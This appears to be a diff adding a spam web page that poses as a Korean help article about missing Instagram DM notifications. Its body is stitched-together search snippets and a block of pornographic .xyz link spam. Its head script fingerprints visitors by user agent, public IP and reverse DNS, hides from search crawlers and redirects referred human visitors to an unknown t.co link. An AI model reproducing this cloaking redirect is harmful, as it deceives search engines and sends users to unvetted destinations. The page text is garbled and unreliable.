@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>11447</title>
+</script>
+</head>
+<body>
+<h1>인스타 Dm 알림 안옴</h1>
+<p>1. 장치에서 인스타그램 알림 허용 · 2. 인스타그램 앱에서 알림 켜기 · 3. 인스타그램 캐시 지우기 · 4. 방해 금지 또는 저전력 모드 · 5. 네트워크 연결 확인 · 6. 최신 인스 ...Aug 7, 2022 — 1. 오른쪽 하단 인스타 프로필 선택 &gt; 오른쪽 상단 전체메뉴 선택 · 2. 아랫 부분 팝업창 메뉴 리스트 &gt; “설정” 선택 · 3. 설정 화면 &gt; “알림” 선택 · 4.인스타내에서도 알림 설정 다 했고.. 설정 -&gt; 알람엔 인스타가 안떠서 설정을 할수없어요ㅠㅠ 다시 깔면 알람 생기나요.인스타그램 다이렉트 메시지(DM) 알람 설정은 개인 및 그룹으로 나누어 따로 설정하는 것도 가능하며, 사용자가 언제든 설정을 변경할 수 있도록 서비스를 제공합니다.Nov 27, 2019 — 제가 아이폰7을 쓰고있고 알림설정도 다 했고 심지어 몇번을 지웠다 다시 깔았다 해봤는데 디엠 알림이 안와요 이럴땐 어떻게 해야하죠?? 첨부 이미지.Dec 17, 2019 — 인스타그램 어플을 재설치 하면 해결이 된다. ​. 인스타그램 어플 재설치하고 로그인을 하면 알림창 허용/비허용이 뜨는데 허용을 클릭하면 된다.Instagram은 앱 내부에 몇 가지 알림 설정을 제공합니다. DM (직접 메시지) 알림, 좋아요 및 댓글 알림 등을 해제 할 수 있습니다. 이 설정이 활성화되어 있는지 확인 ...Feb 22, 2021 — 최근 몇개월간 꾸준히 있어왔는데 앱 삭제후 재설치, 앱 내 알림기능 확인, 설정 앱에서 인스타그램 앱 알림 허용, 백그라운드 앱 새로 고침 등 기능을 ...Oct 22, 2020 — 1 부. Instagram 알림이 작동하지 않는 문제를 해결하는 방법 · 장치를 다시 시작합니다. · 장치가 무음 모드인지 확인하십시오. · 장치에서 업데이트를 수행 ...Dec 13, 2021 — 알림은 다 켜져 있는데 어느 순간부터 알림이 안 오네요;;;;한달동안은 threads 깔아서 알림 대신했는데 한달이 지났는데도 인스타 디엠 알림은 안 ...2 days ago — 좋아요 같은 알림은 울리는데 이상하게 디엠만 알림이 안와서 답답하고 짜증났는데 … 오늘 포스팅에서는 인스타 디엠 알림 오류, 인스타 dm 알림 오류( ...15 hours ago — 인스타그램 캐시 지우기 · 4. 방해 금지 또는 저전력 모드 · 5. 네트워크 연결 확인 · 6. 최신 인스 …7 aug. 2022 — 오늘 포스팅에서는 인스타 디엠 알림 ...인스타 dm 알림 안옴 카카오톡에서든 인스타에서든 페이스북에서든 모르는 사람에게서 메세지를 애초에 많은 분들이 (물론 저도) 인스타. 인스타그램 앱을 실행시켜 ...Apr 24, 2021 — 친구들과 온라인으로 소식을 주고 받을 때 SNS를 많이 이용합니다. 대표적으로 인스타그램이 있는데요. 새로운 글이나 메시지가 오면 알림이 와서 소식을 ...1 hour ago — ... full episode 인스타 비공개계정 사진 다운 Gg dịch google translate ... 페이스톡 알림 안옴 Fedex 배송조회 tracking number location lookup ...4 hours ago — ... Hwp pdf 변환 online signal · 박지현 한의사 인스타그램 ... 아이폰 메시지 알림 안옴 · New teps 기출문제 pdf forms business forms one major ...43 minutes ago — 전남대 생활관 알림마당. Xsmt thứ 3 quảng nam mieng hang ngay 2 ... 유비소프트 비밀번호 이메일 안옴. Qcy앱 중국어. ... 옷 잘입는 남자 인스타.... 개념원리 2 1 답지 rpm 2023 free · 인스타그램 url 오류 ... G2b 안전입찰 2 0 mean one song mean number · 아이폰 메시지 알림 안옴 · Hp 서비스센터 부산 ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
